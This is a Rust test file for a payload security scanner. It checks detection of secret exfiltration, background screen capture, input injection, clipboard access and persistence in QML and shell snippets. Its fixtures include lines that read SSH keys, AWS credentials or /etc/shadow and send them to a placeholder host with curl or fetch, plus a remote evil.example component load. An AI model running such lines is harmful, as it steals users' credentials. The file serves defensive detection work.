//! H6 user-data, desktop automation, capture, clipboard, and persistence
//! capability/escalation coverage.

use crate::detect::*;
use omasafe_core::bounds::TimeBudget;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o755,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: true,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn scan(path: &str, kind: PayloadKind, source: &str) -> AnalysisArtifacts {
    let mut inventory = PayloadInventory {
        entries: vec![entry(path, kind, source.len())],
        ..Default::default()
    };
    analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &TimeBudget::default(),
    )
}

fn has_capability(artifacts: &AnalysisArtifacts, capability: &str) -> bool {
    artifacts
        .capabilities
        .iter()
        .any(|item| item.capability == capability)
}

fn has_rule(artifacts: &AnalysisArtifacts, rule_id: &str) -> bool {
    artifacts
        .rendered_findings()
        .iter()
        .any(|finding| finding.rule_id == rule_id)
}

#[test]
fn sensitive_path_is_capability_only_until_dataflow_reaches_egress() {
    let capability_only = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item { property string path: "~/.ssh/id_rsa" }
"#,
    );
    assert!(has_capability(&capability_only, "sensitive-path"));
    assert!(!has_rule(&capability_only, "oma.qml.sensitive-data-egress"));

    let connected = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    property string secret = readFile("~/.ssh/id_rsa")
    Timer { interval: 1000; running: true; repeat: true }
    Component.onCompleted: fetch("https://example.test", { body: secret })
}

"#,
    );
    assert!(has_capability(&connected, "sensitive-path"));
    assert!(has_rule(&connected, "oma.qml.sensitive-data-egress"));

    let indirect = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    property string path = "~/.aws/credentials"
    property string secret = readFile(path)
    fetch("https://example.test", { body: secret })
}
"#,
    );
    assert!(has_rule(&indirect, "oma.qml.sensitive-data-egress"));
}

#[test]
fn h6_function_local_sensitive_value_does_not_escape_scope() {
    let artifacts = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    function prepare() {
        var secret = readFile("~/.ssh/id_rsa")
    }
    fetch("https://example.test", { body: secret })
}
"#,
    );
    assert!(!has_rule(&artifacts, "oma.qml.sensitive-data-egress"));
}

#[test]
fn h6_safe_reassignment_clears_sensitive_provenance() {
    let artifacts = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    property string secret = readFile("~/.ssh/id_rsa")
    secret = "safe"
    fetch("https://example.test", { body: secret })
}
"#,
    );
    assert!(!has_rule(&artifacts, "oma.qml.sensitive-data-egress"));
}

#[test]
fn h6_copy_propagates_sensitive_provenance_to_egress() {
    let artifacts = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    property string secret = readFile("~/.ssh/id_rsa")
    property string payload = secret
    fetch("https://example.test", { body: payload })
}
"#,
    );
    assert!(has_rule(&artifacts, "oma.qml.sensitive-data-egress"));
}

#[test]
fn script_sensitive_read_to_egress_is_high_but_shadow_stays_non_high() {
    let script = scan(
        "install.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsecret=$(cat \"$HOME/.aws/credentials\")\ncurl -X POST https://example.test --data \"$secret\"\n",
    );
    assert!(has_capability(&script, "sensitive-path"));
    assert!(has_rule(&script, "oma.script.sensitive-data-egress"));

    let shadow = scan(
        "check.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncat /etc/shadow\ncurl https://example.test\n",
    );
    assert!(!shadow.rendered_findings().iter().any(|finding| {
        finding.rule_id == "oma.script.sensitive-data-egress" && finding.severity == "high"
    }));
    let shadow_direct = scan(
        "check.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl https://example.test --data \"$(cat /etc/shadow)\"\n",
    );
    assert!(!has_rule(
        &shadow_direct,
        "oma.script.sensitive-data-egress"
    ));

    let unrelated_same_line = scan(
        "check.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncat \"$HOME/.ssh/id_rsa\" >/dev/null; curl --version\n",
    );
    assert!(has_capability(&unrelated_same_line, "sensitive-path"));
    assert!(
        !has_rule(&unrelated_same_line, "oma.script.sensitive-data-egress"),
        "unrelated commands on one line are not a dataflow edge"
    );
}

#[test]
fn disabled_background_timer_does_not_taint_later_user_action() {
    let artifacts = scan(
        "capture.qml",
        PayloadKind::Qml,
        r#"Item {
    Timer {
        interval: 1000
        running: false
    }
        MouseArea {
            onClicked: {
                Process { command: ["grim"] }
            }
        }
    }
}
"#,
    );
    assert!(!has_rule(&artifacts, "oma.qml.screen-capture-background"));
}

#[test]
fn disabled_nested_timer_preserves_surrounding_completed_background_scope() {
    let artifacts = scan(
        "capture.qml",
        PayloadKind::Qml,
        r#"Item {
    Component.onCompleted: {
        Timer {
            interval: 1000
            running: false
        }
        Process { command: ["grim"] }
    }
}
"#,
    );
    assert!(has_rule(&artifacts, "oma.qml.screen-capture-background"));
}

#[test]
fn background_timer_state_does_not_escape_its_object_scope() {
    let artifacts = scan(
        "capture.qml",
        PayloadKind::Qml,
        r#"Item {
    Timer {
        interval: 1000
        running: true
        onTriggered: { Process { command: ["grim"] } }
    }
    Process { command: ["grim"] }
}
"#,
    );
    let background = artifacts
        .rendered_findings()
        .into_iter()
        .filter(|finding| finding.rule_id == "oma.qml.screen-capture-background")
        .collect::<Vec<_>>();
    assert_eq!(background.len(), 1);
    assert_eq!(background[0].line, Some(5));
}

#[test]
#[cfg(feature = "qml-parser")]
fn function_local_url_does_not_escape_to_an_outer_loader() {
    let artifacts = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    function prepare() {
        var remoteUrl = "https://evil.example/component.qml"
    }
    Loader { source: remoteUrl }
}
"#,
    );
    assert!(!has_rule(&artifacts, "oma.qml.remote-component-load"));
}

#[test]
#[cfg(feature = "qml-parser")]
fn resolved_promise_callback_is_not_network_response_data() {
    let artifacts = scan(
        "Main.qml",
        PayloadKind::Qml,
        r#"Item {
    Promise.resolve("date").then(value => Quickshell.execDetached(value))
}
"#,
    );
    assert!(!has_rule(&artifacts, "oma.qml.detached-execution"));
}

#[test]
fn h6_assignment_state_limit_is_disclosed() {
    let mut source = String::from("Item {\n");
    for index in 0..4100 {
        source.push_str(&format!("    property string value{index} = \"safe\"\n"));
    }
    source.push_str("}\n");
    let artifacts = scan("Main.qml", PayloadKind::Qml, &source);
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation.starts_with("h6-assignment-limit:"))
    );
}

#[test]
fn input_capture_clipboard_and_persistence_observations_are_bounded() {
    let input = scan(
        "input.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nwtype \"hello\"\n",
    );
    assert!(has_capability(&input, "input-injection"));
    assert!(!has_rule(&input, "oma.script.input-injection-background"));

    let compositor_only = scan(
        "compositor.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nhyprctl reload\n",
    );
    assert!(!has_capability(&compositor_only, "input-injection"));

    let input_background = scan(
        "input.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsystemd-run --user -- wtype \"$USER_INPUT\"\n",
    );
    assert!(has_rule(
        &input_background,
        "oma.script.input-injection-background"
    ));

    let capture = scan(
        "capture.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ngrim > /tmp/screenshot.png\n",
    );
    assert!(has_capability(&capture, "screen-capture"));
    assert!(!has_rule(&capture, "oma.script.screen-capture-background"));

    let capture_background = scan(
        "capture.qml",
        PayloadKind::Qml,
        "Item { Timer { interval: 1000; running: true; repeat: true\n    onTriggered: { Process { command: [\"grim\"] } }\n  } }\n",
    );
    assert!(has_rule(
        &capture_background,
        "oma.qml.screen-capture-background"
    ));

    let clipboard = scan(
        "clipboard.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nwl-copy hello\nwl-paste --watch cat\n",
    );
    assert!(has_capability(&clipboard, "clipboard-access"));
    assert!(
        !clipboard
            .rendered_findings()
            .iter()
            .any(|finding| { finding.rule_id == "oma.script.sensitive-data-egress" })
    );

    let persistence = scan(
        "persist.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncp service \"$HOME/.config/systemd/user/foo.service\"\nsystemctl enable foo.service\n",
    );
    assert!(has_capability(&persistence, "persistence-scheduling"));
    assert!(has_rule(&persistence, "oma.script.persistence-background"));
}
